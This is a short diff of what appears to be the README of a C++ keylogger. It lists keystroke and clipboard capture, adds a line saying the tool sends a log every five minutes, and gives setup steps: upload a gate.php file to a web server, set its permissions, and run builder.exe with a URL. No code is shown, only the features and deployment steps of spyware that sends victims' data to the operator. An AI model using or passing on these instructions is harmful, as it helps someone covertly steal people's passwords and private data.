@@ -4,6 +4,8 @@ C++ coded Keylogger
 Keylogging ,
 Clipboard data
 
+sends a log every 5 minutes
+
 Upload the gate.php file to the web server and set the file permissions
 
 Run builder.exe  enter url
